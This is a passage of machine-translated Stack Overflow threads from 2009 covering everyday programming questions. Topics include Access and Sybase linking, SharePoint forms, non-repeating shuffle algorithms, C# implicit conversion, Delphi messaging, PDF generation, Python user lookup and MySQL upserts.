是的，假设 Sybase 提供兼容的 ODBC 驱动程序，您应该能够将 ODBC 链接表用于您的 Sybase 数据库。但是，我建议不要使用 DSN，而是使用无 DSN 连接。我所做的是在我的编程 PC 上定义一个 DSN，在链接表之后，我运行[Doug Steele 的代码以转换为无 DSN 的连接字符串](http://www.accessmvp.com/DJSteele/DSNLessLinks.html)。

该应用程序应该可以正常工作，但有些事情可能需要调整。不要期望任何性能改进——事实上，你更有可能失去性能。然后，您可以检查应用程序中性能不佳的部分，并评估如何使它们更好地与服务器后端一起工作。通常这涉及在服务器上创建视图，或编写存储过程（用于诸如插入或更新记录之类的事情），或使用直通查询（这样 Jet 不会触及 SQL，而只是将其传递给服务器执行）。

这可能很复杂，尽管我发现它并不像我第一次升迁时预期的那么难。

# sharepoint - 自定义 SharePoint 的 NewForm.aspx，或者创建我自己的表单……想法？

> ID：860098
> 
> 赞同：2
> 
> 时间：2009-05-13T19:59:28.877
> 
> 标签：sharepoint, moss, wss

我不确定我的问题会有明确的答案，但我想阅读其他人对此的一些讨论......这里有一些快速背景。

我正在创建一个请求表单，它将处理向我们的数据中心添加新设备。我正在收集一些关于提交者和要添加的设备的基本信息。一些元数据变得相当复杂，但我不会在这里讨论。

起初，我从启用浏览器的 InfoPath 表单开始，因为我们的大多数用户都没有获得 InfoPath 富客户端的许可。在经历了很多挫折之后，我得到了一些工作，但永远无法达到我满意的表现水平。从那以后，我一直在使用 SharePoint 的 Web 服务，并且我有一个很棒的表单，我用 HTML 编写（使用一些 jQuery 魔术）提交到 SharePoint 列表。

所以现在我问自己......为什么不直接使用这个表格？首先，我可以完全摆脱 InfoPath……这也有助于我们获得许可，因为我不需要企业许可。第二，性能……第三，当然我必须手动编码，但我可以，而且我很享受。

因此，InfoPath 已被淘汰。

这导致我需要将一些最佳实践想法与新想法混合在一起。我有这个很好用的表单，但我希望一切都能在 SharePoint 中工作。作为测试，我刚刚为我的列表创建了一个新视图，删除了显示列表的 Web 部件，然后放入我的表单中。除了一些 CSS 问题之外，一切正常，而且它会快速更新列表！

但它应该是自定义视图吗？它应该住在其他地方吗？我应该只编辑 NewForm.aspx 吗？

我很想听听对此的一些想法。最终，我的整个解决方案将作为一项功能部署，但我不确定这是否相关。

谢谢！！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-14T03:58:22.977

我会以同样的方式完成它：

*   创建新表单（通过 SharePoint Designer 或自定义 ASPX 页面）
*   将表单封装在 Web 部件中（如果您赶时间，可以使用[SmartPart Web部件）](http://www.codeplex.com/smartpart)
*   根据需要创建任意数量的自定义视图，它不会真正干扰您对表单进行编码的方式

如果必须修改 NewForm.aspx，请不要删除默认的 ListForm Webpart，因为 SharePoint 将它用于其他用途。你最好只是隐藏它以避免将来出现问题。

希望有帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-19T18:19:13.363

我认为您应该为您的请求 SharePoint-List 创建自定义表单模板。
请参阅[MSDN：创建自定义表单模板](http://msdn.microsoft.com/en-us/library/aa544142.aspx)。

我还建议阅读[了解 SharePoint：列表表单](http://hristopavlov.wordpress.com/2009/02/17/understanding-sharepoint-list-forms/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-15T04:23:20.817

使用自定义表单或完全独立的应用程序来编辑 SharePoint 数据没有任何问题。您最终会得到与使用标准新表单相同的数据，因此它不可能破坏修改后的视图之外的任何内容。

设置自定义新表单可能是最合适的地方 - 很容易在 schema.xml 或通过设计器更改新表单 url。

# algorithm - 在天体点唱机上实施洗牌

> ID：860100
> 
> 赞同：4
> 
> 时间：2009-05-13T19:59:33.963
> 
> 标签：algorithm, language-agnostic, math, random, puzzle

如何为“Celestial Jukebox”实施洗牌？

更准确地说，在每个时间 t，返回一个介于 0..n(t) 之间的均匀随机数，这样整个序列中没有重复，n() 随着时间的推移而增加。

对于具体的例子，假设一个固定费率的音乐服务允许通过从 0 开始的索引号播放目录中的任何歌曲。每隔一段时间，就会添加新歌曲，从而增加索引号的范围。目标是每次播放一首新歌（假设目录中没有重复）。

一个理想的解决方案在现有硬件上是可行的——我如何在 8MB 的 DRAM 中硬塞一个包含 600 万首歌曲的列表？同样，高歌曲数会加剧 O(n) 选择时间。

-- 对于 LCG 发生器，给定 0..N [0]上部分耗尽的 LCG ，是否可以将其转换为 0..N [1]上的不同 LCG （其中 N1 > N0），不会重复耗尽的序列。
- 检查一首特定的歌曲是否已经播放过似乎很快就会失控，尽管这可能是唯一的方法？是否有有效的数据结构？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-13T20:05:20.583

我喜欢做这种非重复随机选择的方式是有一个列表，每次我在 之间随机选择一个项目时`[0-N)`，我都会从该列表中删除它。在您的情况下，随着新项目被添加到目录中，它也会被添加到尚未选择的列表中。完成后，只需将所有歌曲重新加载回列表即可。

编辑：

如果您考虑 v3 的建议，这基本上可以在初始化步骤`O(1)`之后的时间内完成。`O(N)`它保证不重复的随机选择。

这是回顾：

1.  将初始项目添加到列表中
2.  随机选择索引`i`（从 集合中`[0,N)`）
3.  删除索引处的项目`i`
4.  将洞替换为`i` 项目`Nth`（或 null if `i == Nth`）并递减`N`
5.  对于新项目，只需附加到列表的末尾并`N`根据需要增加
6.  如果您曾经播放过所有歌曲（我怀疑您是否有 6M 首歌曲），然后将所有歌曲添加回列表中，起泡、冲​​洗并重复。

Since you are trying to deal with rather large sets, I would recommend the use of a DB. A simple table with basically two fields: `id` and "`pointer`" (where "`pointer`" is what tells you the song to play which could be a GUID, FileName, etc, depending on how you want to do it). Have an index on `id` and you should get very decent performance with persistence between application runs.

EDIT for 8MB limit:

Umm, this does make it a bit harder... In 8 MB, you can store a maximum of ~2M entries using 32-bit keys.

So what I would recommend is to pre-select the next 2M entries. If the user plays through 2M songs in a lifetime, damn! To pre-select them, do a pre-init step using the above algorithm. The one change I would make is that as you add new songs, roll the dice and see if you want to randomly add that song to the mix. If yes, then pick a random index and replace it with the new song's index.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T23:08:52.470

With a limit of 8MB for 6 million songs, there's plainly not room to store even a single 32 bit integer for each song. Unless you're prepared to store the list on disk (in which case, see below).

If you're prepared to drop the requirement that new items be immediately added to the shuffle, you can generate an LCG over the current set of songs, then when that is exhausted, generate a new LCG over only the songs that were added since you began. Rinse and repeat until you no longer have any new songs. You can also use [this rather cool algorithm](http://blog.notdot.net/2007/9/Damn-Cool-Algorithms-Part-2-Secure-permutations-with-block-ciphers) that generates an unguessable permutation over an arbitrary range without storing it.

If you're prepared to relax the requirement of 8MB ram for 6 million songs, or to go to disk (for example, by memory mapping), you could generate the sequence from 1..n at the beginning, shuffle it with fisher-yates, and whenever a new song is added, pick a random element from the so-far-unplayed section, insert the new ID there, and append the original ID to the end of the list.

If you don't care much about computational efficiency, you could store a bitmap of all songs, and repeatedly pick IDs uniformly at random until you find one you haven't played yet. This would take 6 million tries to find the last song (on average), which is still damn fast on a modern CPU.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T20:12:30.930

While Erich's solution is probably better for your specific use case, checking if a song has already been played is very fast (amortized O(1)) with a hash-based structure, such as a `set` in Python or a `hashset<int>` in C++.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-13T20:23:24.190

You could simply generate the sequence of numbers from 1 to n and then shuffle it using a Fisher-Yates shuffle. That way you can guarantee that the sequence won't repeat, regardless of n.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-13T21:10:55.797

You could use a linked list inside an array: To build the initial playlist, use an array containing a something like this:

```
 struct playlistNode{
  songLocator* song;
  playlistNode  *next;
};
struct playlistNode arr[N]; 
```

Also keep a 'head' and 'freelist' pointer;

Populate it in 2 passes:
1\. fill in arr with all the songs in the catalog in order 0..N.
2\. randomly iterate through all the indexes, filling in the `next` pointer;

Deletion of songs played is O(1):

```
head=cur->next;
cur->song=NULL;
freelist->next = freelist;
cur->next=freelist;
freelist=cur; 
```

Insertion of new songs is O(1) also: pick an array index at random, and patch a new node.

```
node = freelist;
freelist=freelist->next;
do {
i=rand(N);   
} while (!arr[i].song);  //make sure you didn't hit a played node
node->next = arr[i].next;
arr[i].next=node; 
```

# java - Java开源课程管理系统

> ID：860103
> 
> 赞同：3
> 
> 时间：2009-05-13T20:00:01.577
> 
> 标签：java, open-source, sakai

我正在寻找一个开源项目来提供课程培训和管理课程、讲师。我需要类似于[Moodle](http://moodle.org)但在 Java 中的东西。谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-05-13T21:01:45.453

有[酒井](http://sakaiproject.org/portal)。有合理的记录，但也相当复杂。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T20:01:54.753

查看[http://www.jediproject.net/](http://www.jediproject.net/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T20:09:11.060

以下是用 Java 编写的开源 LMS（学习管理系统）列表：

[http://www.roseindia.net/opensource/learningmanagementsystems.php](http://www.roseindia.net/opensource/learningmanagementsystems.php)

# visual-studio - 忽略#pragma 注释（lib，...）？

> ID：860109
> 
> 赞同：2
> 
> 时间：2009-05-13T20:01:45.193
> 
> 标签：visual-studio, linker, visual-c++, nmake, pragma

我正在尝试执行以前生成的 .obj 文件的链接（使用最新版本的 MSVC）。

创建这些 .obj 时，源代码指定：

```
#pragma comment(lib, ...) 
```

因此，链接器正在尝试链接源中指定的静态库。有没有办法指示链接器忽略这些库，所以我可以指定我自己的？

例如，如果一个来源做了以下事情：

```
#pragma comment(lib, foo.lib) 
```

在链接时，我希望链接器忽略“foo.lib”，而是链接到“bar.lib”。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T20:11:14.257

为什么不更改源（`#pragma`指令）？

从[`comment`](http://msdn.microsoft.com/en-us/library/7f0aews7(VS.80).aspx)MSDN 页面：

> 库
> 
> 在目标文件中放置一个库搜索记录。此注释类型必须附带一个注释字符串参数，该参数包含您希望链接器搜索的库的名称（可能还有路径）。库名称遵循目标文件中的默认库搜索记录；如果没有使用 /nodefaultlib 指定该库，则链接器将搜索此库，就像您在命令行中命名它一样。您可以将多个图书馆搜索记录放在同一个源文件中；每条记录在目标文件中的出现顺序与在源文件中出现的顺序相同。
> 
> 如果默认库和添加的库的顺序很重要，则使用 /Zl 开关进行编译将阻止将默认库名称放置在目标模块中。然后可以使用第二个注释编译指示在添加的库之后插入默认库的名称。与这些 pragma 一起列出的库将按照它们在源代码中的相同顺序出现在目标模块中。

您还可以使用[`NODEFALTLIB`](http://msdn.microsoft.com/en-us/library/3tz4da4a(VS.80).aspx)链接器选项停止`foo.lib`链接，并`bar.lib`像指定其他 lib 文件一样（即通过链接器属性窗格）。

否则，重命名`bar.lib`为`foo.lib`（一个厚颜无耻的解决方案）。

# debugging - 调试器不适用于 JMockit

> ID：860112
> 
> 赞同：6
> 
> 时间：2009-05-13T20:02:09.107
> 
> 标签：debugging, junit4, jmockit, javaagents

希望这里有一个简单的问题......

我正在使用 RAD 7.5.2，并且正在编写 Junit 测试。我用 JUnit 3 写得很好，然后我想模拟一些函数调用。所以我加载了 jmockit 0.9.7 和 Junit 4.6。我还包括 -javaagent:jmockit.jar 作为 VM 参数。

当我“运行为 Junit 测试”时，它完全没有问题（至少，我在输出中看不到任何问题）。Junit 的输出很好，没有错误转储到控制台。

当我“调试为 Junit 测试”时，它不起作用。它让我陷入：

InstrumentationImpl.class --> 找不到源

......当我点击继续......

NativeMethodAccessorImpl.class --> 找不到源

...当我点击继续...

JUnit 在此之后结束。它将以下内容转储到控制台：

* * *

在 sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:79) 在 sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) 在 sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl) 的线程“main”java.lang.reflect.InvocationTargetException 中的异常.java:43) at java.lang.reflect.Method.invoke(Method.java:618) at sun.instrument.InstrumentationImpl.loadClassAndCallPremain(InstrumentationImpl.java:160) 原因：java.lang.UnsatisfiedLinkError: sun/instrument/ InstrumentationImpl.redefineClasses0([Ljava/lang/instrument/ClassDefinition;)V at sun.instrument.InstrumentationImpl.redefineClasses(InstrumentationImpl.java:98) at mockit.internal.RedefinitionEngine.redefineMethods(RedefinitionEngine.java:197) at mockit.internal。重新定义引擎。在 mockit.internal.RedefinitionEngine.redefineMethods(RedefinitionEngine.java:116) 在 mockit.internal.RedefinitionEngine.setUpInternalStartupMock(RedefinitionEngine.java:53) 在 mockit.internal.Startup.loadInternalStartupMocks(Startup.java) 的 redefineMethods(RedefinitionEngine.java:184) :123) 在 mockit.internal.Startup.initialize(Startup.java:110) 在 mockit.internal.Startup.premain(Startup.java:97) ... 还有 5 个

致命错误：处理 -javaagent 失败

* * *

我可以毫无问题地在我的测试上运行 JUnit 3 和 JUnit 4，当我使用 -javaagent:jmockit.jar （使用调试器；它们本身很好）时，事情变得丑陋，我必须这样做使用 jmockit 的东西。

想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-07-02T14:39:46.117

我定期在调试模式下运行使用 JMockit（带有和不带有“-javaagent”JVM 参数）的 JUnit 测试，并且从未遇到任何问题。

您确定“Debug as Junit Test”配置的类路径与“Run As Junit Test”配置的类路径相同吗？由于您收到 UnsatisfiedLinkError，可能是缺少一些 jar 文件。

如果这不是错误的原因，那么它可能是 RAD 7.5.2 特有的东西......

# c# - 类隐式转换

> ID：860118
> 
> 赞同：0
> 
> 时间：2009-05-13T20:03:37.483
> 
> 标签：c#, casting, type-inference, implicit-typing

我知道我可以对类使用隐式转换，如下所示，但是有什么方法可以让实例在没有强制转换或转换的情况下返回字符串？

```
public class Fred
{
    public static implicit operator string(Fred fred)
    {
        return DateTime.Now.ToLongTimeString();
    }
}

public class Program
{
    static void Main(string[] args)
    {
        string a = new Fred();
        Console.WriteLine(a);

        // b is of type Fred. 
        var b = new Fred(); 

        // still works and now uses the conversion
        Console.WriteLine(b);    

        // c is of type string.
        // this is what I want but not what happens
        var c = new Fred(); 

        // don't want to have to cast it
        var d = (string)new Fred(); 
    }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-05-13T20:04:34.937

实际上，编译器会隐式`Fred`转换为，`string`但由于您使用`var`关键字声明变量，编译器将不知道您的实际意图。您可以将变量声明为字符串，并将值隐式转换为字符串。

```
string d = new Fred(); 
```

换句话说，您可能已经为不同类型声明了十几个隐式运算符。您如何期望编译器能够在其中之一之间进行选择？编译器将默认选择实际类型，因此它根本不必执行强制转换。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T20:04:47.777

使用隐式运算符（您拥有），您应该能够使用：

```
 string d = new Fred(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T20:06:10.910

你要

`var b = new Fred();`

为 fred 类型，并且

`var c = new Fred();`

是字符串类型？即使声明是相同的？

正如其他海报所提到的，当您声明一个新的 Fred() 时，它将是 Fred 类型，除非您给出*一些*指示它应该是`string`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-13T20:07:29.380

不幸的是，在示例中，c*是*Fred 类型。虽然 Freds 可以转换为字符串，但最终 c 是 Fred。要将 d 强制为字符串，您必须告诉它将 Fred 转换为字符串。

如果你真的想让 c 成为一个字符串，为什么不把它声明为一个字符串呢？

# delphi - Delphi 自定义消息处理程序

> ID：860119
> 
> 赞同：4
> 
> 时间：2009-05-13T20:03:50.400
> 
> 标签：delphi, windows-messages

当用户双击 dbgrid 时，我会显示一个非模态表单。

当他们关闭该表单时，我想刷新网格。

为此，我尝试了以下方法：

1 - 定义自定义消息常量：

```
const
  WM_REFRESH_MSG = WM_USER + 1;  //defined in a globally available unit 
```

2 - 在我的非模态表单的 OnClose 事件中，我有这个：

```
procedure TMyNonModalForm.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  PostMessage(Self.Handle,WM_REFRESH_MSG,0,0);
end; 
```

3 - 在包含 dbGrid 的表单的私有声明中，我有这个：

```
procedure OnRefreshRequest(var Msg: TMessage); message WM_REFRESH_MSG;

...

procedure TMyFormWithADBGrid.OnRefreshRequest(var Msg: TMessage);
begin
  RefreshGrid;
end; 
```

完成这些操作后，PostMessage 会正常触发，但 OnRefreshRequest 过程永远不会运行。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-05-14T09:59:21.797

请注意，WM_USER 不是作为您自己的消息基础的正确常量，除非您正在编写直接从 TWinControl 下降的自定义控件。请改用 WM_APP。

此外，将 UM_ 用于用户消息而不是 WM_ 被认为是一种很好的风格，因为该前缀应该为 Windows 头文件保留。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-05-13T20:21:08.890

除了另一个答案中的消息名称之外，您正在向 Self.Handle 发布消息，而 Self 正在离开。您可能打算发布到不同的句柄（启动无模式句柄的窗口）。当您创建它时，让您的无模式窗口访问该句柄，并在那里发布消息。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T20:21:33.850

发布消息需要发送到另一个窗口句柄，而不是您列出的 self.handle。一种方法是在非模态表单上创建一个新属性，并在显示非模态表单之前为其分配另一个表单的句柄。

除此之外，并正确实施 WM_REFRESH_MSG（CheGueVerra 正确）它应该可以正常工作。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T20:10:26.050

您可以尝试更改声明的结尾以匹配您尝试发送的消息。

```
procedure OnRefreshRequest(var Msg: TMessage); message WM_CEA_REFRESH; 
```

应该是这个

```
procedure OnRefreshRequest(var Msg: TMessage); message WM_REFRESH_MSG; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-15T15:32:29.070

我上传了一个“凯文会做什么？”的例子。到 Embarcadero 的新闻组论坛 embarcadero.public.attachments。

基本上，当非模态表单关闭时，主表单（或您想要的任何表单/对象）订阅的自定义事件。在主要（或其他）形式...

```
var
  NonModalForm :TfmNonModalForm;
begin
  NonModalForm := TfmNonModalForm.Create(nil); 
  NonModalForm.Execute(NonModalFormClosingListener); 
```

在执行方法中

```
procedure TfmNonModalForm.Execute(YourListenerMethod: THeyIClosedEvent);
begin
   FHeyIClosedEvent := YourListenerMethod;
   Show();
end; 
```

如果您无法访问论坛并需要其他代码，请发表评论，我会发布缺失的部分。

祝你好运

# .net - 使用 ITextSharp 和 PDFSharp 呈现 PDF 表的性能无法接受

> ID：860132
> 
> 赞同：2
> 
> 时间：2009-05-13T20:06:30.550
> 
> 标签：.net, pdf, itextsharp, pdfsharp

我正在尝试生成包含大量表格的 PDF 文件。每个 PDF 的长度可能为 150 页。

使用[ITextSharp](http://itextsharp.sourceforge.net/)时，文件大小最大为 16 兆字节，压缩时没有明显的收缩。

使用[PDFSharp](http://www.pdfsharp.net/PDFsharp/)时，文件大小非常合理，为 2 或 3 兆字节，但生成文档需要不可接受的时间长度（我在 3 分钟后取消了它）。

有没有人建议使用 .NET 有效地生成复杂的 PDF 文件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-08-25T09:44:47.493

您说的是 PDFsharp，但实际上您使用的是 MigraDoc。是的，在 1.32 版中，使用 MigraDoc Foundation 进行表格渲染仍然很慢。

1.50 版总体上带来了巨大的速度改进，在 1.50 beta 2 中，我们特别解决了缓慢的表格渲染问题。

测试结果：
PDFsharp + MigraDoc WPF 1.32.2608：
平均：24.443 秒
来自 Pakeha 的 MigraDoc-1.32-patched-release (WPF)：
平均：9.114 秒
PDFsharp + MigraDoc (WPF) 1.50.3638-beta：
平均：16.114 秒
PDFsharp + MigraDoc (WPF) 1.50.3915-beta2：
平均：1.559 秒

另见：
[https ://forum.pdfsharp.net/viewtopic.php?p=9379#p9379](https://forum.pdfsharp.net/viewtopic.php?p=9379#p9379)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2011-11-13T13:28:13.147

已经提交了一个补丁，它极大地提高了表格渲染性能 - 表格越大，显然改进越大。在运行快速测试时，我对一个有 200 行的表的结果是：

*   (原始 DLL) [ResultsGenerator] [Info] PDF 结果写入：00:00:25.9754857
*   （已修补的 DLL）[ResultsGenerator] [Info] PDF 结果写入：00:00:03.9472258

[http://forum.pdfsharp.net/viewtopic.php?f=2&t=679&start=0#p4888](http://forum.pdfsharp.net/viewtopic.php?f=2&t=679&start=0#p4888)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T20:13:32.880

当我的公司测试写出 PDF 的性能时，我们选择了[TallComponents](http://www.tallcomponents.com/tallpdf3.aspx)的 TallPDF。我围绕 lib 编写了一个包装器，并认为它很容易使用并且在大型数据集上表现良好。

# c# - 以编程方式搜索和选择 TreeView 项目？

> ID：860134
> 
> 赞同：1
> 
> 时间：2009-05-13T20:07:18.413
> 
> 标签：c#, wpf, treeview, treeviewitem

在我的 3d 应用程序中，我有一个`TreeView`数据绑定到`ObservableCollection`我的 3d 场景中的对象。理论上，用户可以单击 3d 视图中的对象，这应该更新`TreeView`以选择相应的项目。但我不知道怎么做。我所拥有的只是用户选择的 3d 对象。

我该怎么做呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T20:38:10.640

[在这里](http://blog.quantumbitdesigns.com/2008/07/22/programmatically-selecting-an-item-in-a-treeview/)找到了解决方案。

[http://blog.quantumbitdesigns.com/2008/07/22/programmatically-selecting-an-item-in-a-treeview/](http://blog.quantumbitdesigns.com/2008/07/22/programmatically-selecting-an-item-in-a-treeview/)

而且他有可以工作的示例源代码，这让各种各样的事情大吃一惊。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2009-05-13T20:21:43.957

我会假设树视图和场景项目都将共享（并由其标识）一个公共 ID 值。然后，在您的 3D 场景或 Treeview 中，实现并订阅您的 TreeView 可能已经拥有的 OnSelectionChanged。然后，当一个更新/更改时，应立即通知另一个，并相应地更新自己。当然，即使在更新时也要吃掉更改，否则您将创建一个令人讨厌的 OnChange 事件循环。

...或者，我误解了你的问题吗？

# python - python中的whoami

> ID：860140
> 
> 赞同：43
> 
> 时间：2009-05-13T20:09:24.650
> 
> 标签：python, posix

找出运行 python 进程的用户的最佳方法是什么？

我可以这样做：

```
name = os.popen('whoami').read() 
```

但这必须开始一个全新的过程。

```
os.environ["USER"] 
```

有时有效，但有时未设置该环境变量。

* * *

## 回答 #1

> 赞同：90
> 
> 时间：2009-05-13T20:12:15.707

```
import getpass
print(getpass.getuser()) 
```

[请参阅getpass](https://docs.python.org/3/library/getpass.html)模块的文档。

> getpass.getuser()
> 
> 返回用户的“登录名”。可用性：Unix、Windows。
> 
> 此函数按顺序检查环境变量 LOGNAME、USER、LNAME 和 USERNAME，并返回第一个设置为非空字符串的值。如果未设置，则在支持 pwd 模块的系统上返回密码数据库中的登录名，否则将引发异常。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2009-05-13T20:12:10.697

这应该在 Unix 下工作。

```
import os
print(os.getuid()) # numeric uid
import pwd
print(pwd.getpwuid(os.getuid())) # full /etc/passwd info 
```

# delphi - 网站与 win32 可执行文件通信的标准方法是什么？

> ID：860151
> 
> 赞同：3
> 
> 时间：2009-05-13T20:11:49.903
> 
> 标签：delphi, web-applications, ipc

我有一些德尔福代码，给定一个项目列表，计算总价，同时考虑到任何可能适用的特殊交易。

用另一种语言重写此代码并非易事。

我应该如何设置它以与在同一台服务器上运行的网站进行通信？每次用户更新购物车时，网站都需要询问价格。可能会有多个并发请求。

delphi 代码需要维护一个内存中的特价商品列表，并定期从数据库中刷新。所以它不能简单地每次都执行或任何简单的事情。

我不知道网站是用什么写的，也不知道它在哪个http服务器下运行，所以我只是在寻找想法或标准方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-13T20:23:07.917

听起来 win32 应用程序已经作为 Windows 服务在盒子上运行。因此，如果您无法修改该服务，您将不得不处理它想要接受和响应请求的任何方式。这可以通过套接字或一些更高级别的通信协议，如 Web 服务。

你可以做几件事。编写一个知道如何与服务通信的程序集，并让您的网站使用该程序集。或者，您可以构建一个 shim 服务，该服务知道如何与遗留服务进行通信，但通过更高级别的协议（如 Web 服务）进行通信。无论哪种方式都可以将并发、线程和通信问题隐藏在易于调用的接口后面，但后者将使每个人都更容易与服务进行通信。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-13T20:35:17.477

如果您可以修改 delphi 应用程序以接受 XML 请求并通过 TCP 套接字（理想情况下使用 HTTP 协议）以 XML 响应进行响应，您将能够相对轻松地使其与大多数 Web 服务器框架进行互操作。但是如何实现这种集成的具体细节将取决于它所使用的语言/框架。

如果 web 服务器在 windows 上，您可以将 delphi 应用程序编译为可以返回 XML 或 HTML 的 DLL，将参数作为 URL 或 POST 操作的一部分。有关为 Web 服务器制作 Delphi DLL 的一些细节在[这里](http://mc-computing.com/Databases/Delphi/WebServers/WebServers.html)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T20:33:34.733

现有系统在什么 Web 服务器或操作系统下运行并不重要。重要的是您希望您的代码在什么下运行。如果是 Windows，那么最简单的解决方案是使用 WebBroker 并编写自定义 ISAPI 应用程序，或者使用 SOAP 公开 Web 服务。例如，如果您想编写类似 API 的 REST，则可以使用第一种方法，如果您的 Web 应用程序能够使用 Web 服务，则可以使用第二种方法。

如果您在 IIS 下的同一个机器上同时运行两者，则另一个选择是创建一个 COM/Automation 对象，然后您可以通过服务器端脚本 (ASP) 调用该对象。如果应用程序是 ASP.NET 应用程序，那么我将使用 PRISM 将您的代码移植到程序集中。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-05-13T22:37:46.560

我用一个相当复杂的工人补偿计算器完成了这项工作。[我使用RemObjects Sdk](http://www.remobjectssdk.com/)创建了一个 Windows 服务。计算以soap方法公开，因此几乎任何东西都可以访问它。

没有必要在服务中使用 RemObjects，但由于它处理了许多底层管道，因此它使操作变得更加容易。客户端不需要 RemObjects，他们只需要能够调用 soap 方法。几乎任何编程语言都可以做到这一点。

您还可以为 IIS 创建一个 isapi dll，它公开一个肥皂接口。如果不同服务器上的其他网站需要访问这些方法，这将很有用。但是，在我的情况下，我通过在防火墙中打开一个端口来访问我的 Windows 服务来处理这个问题。

网上有很多例子。开始阅读的几个地方是[About.Com](http://delphi.about.com/od/webservices/Developing_Web_Services_with_Delphi.htm)和[Bob 博士](http://www.drbob42.com/SOAP/home.htm)。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-13T20:38:20.063

将此应用程序撕成 Windows 服务。编写将与您的 Windows 服务通信的 Web 服务。您应该花一些时间来设计您的 Web 服务，因为这个 Web 服务将成为您的一致界面，屏蔽旧的 Delphi 应用程序。因此，将来无论何时您想要编写 Web 应用程序、移动应用程序或任何您能想象到的东西，您都将拥有一个一致的接口——XML Web 服务。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-08-21T16:29:44.867

将 Web 应用程序与后台服务集成的一种流行方式是消息代理。

消息流将是：

*   Web 应用程序将“计算请求”消息发送到消息代理上的消息目标，其中包含所有需要的参数以及关联 ID，以将计算请求与来自 Delphi 服务的响应相匹配

*   一个（或者，在高可用性/负载平衡环境中更多）Delphi 服务处理消息：拉下一条传入消息，通过将参数提供给计算引擎来处理它，然后将“计算结果消息”发送回 Web 服务器

*   Web 服务器可以同步等待响应（并丢弃没有匹配相关 ide 的响应）并构建结果 HTML 文档，或者继续执行其他任务并在单独的线程中异步接收计算结果，例如在基于 Ajax 的线程中Web应用程序

有关 Dopplr 图像服务的介绍，请参阅此幻灯片：

[http://de.slideshare.net/carsonified/dopplr-its-made-of-messages-matt-biddulph-presentation](http://de.slideshare.net/carsonified/dopplr-its-made-of-messages-matt-biddulph-presentation)

![由马特·比杜夫（matt biddulph）的消息制成](https://i.stack.imgur.com/4rR2Y.jpg)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-05-13T22:48:46.060

如果你可以让它成为一个服务（但不是一个库），你必须以某种方式进行进程间通信——在 Windows 上有几种方法可以做到这一点：

*   直接使用套接字，这是最难的，因为您必须自己进行编组/验证*   共享内存（糟糕！）*   RPC 效果很好但并非微不足道*   DCOM 更容易但配置起来很痛苦*   WCF - 但是你可以从用 Delphi 编写的 Windows 服务调用它吗？

# php - 您可以进行选择性插入或更新吗？

> ID：860164
> 
> 赞同：1
> 
> 时间：2009-05-13T20:12:53.300
> 
> 标签：php, sql, mysql

我正在尝试创建一个时间表并希望完成以下 SQL 查询：

我有 datebeginning 和 dateending 和 jobid 字段，如果给定的作业 ID 不存在打开的字段，我只想添加一个新字段，如果不存在，我希望查询更新给定 ID 的字段 dateending。有没有办法在不使用 PHP 先选择然后插入或更新的情况下做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-05-13T20:18:00.750

使用`INSERT ... ON DUPLICATE KEY UPDATE ...`，见[http://dev.mysql.com/doc/refman/5.0/en/insert.html](http://dev.mysql.com/doc/refman/5.0/en/insert.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T20:18:36.927

```
INSERT INTO table (jobid, datebeginning, dateending) VALUES (1,'2009/03/03','2009/05/05')
ON DUPLICATE KEY UPDATE dateending='2009/06/06'; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T21:51:32.440

由于您将问题标记为 MySQL，您可能还考虑使用“REPLACE INTO”，这当然取决于您填写所有字段，因为此命令插入或删除和插入，而不是仅更新一个字段。如果提供所有字段，REPLACE INTO 也可以。

[http://dev.mysql.com/doc/refman/5.0/en/replace.html](http://dev.mysql.com/doc/refman/5.0/en/replace.html)

# apache-flex - Flex / AS3：减少红眼

> ID：860168
> 
> 赞同：1
> 
> 时间：2009-05-13T20:13:16.093
> 
> 标签：apache-flex, actionscript-3

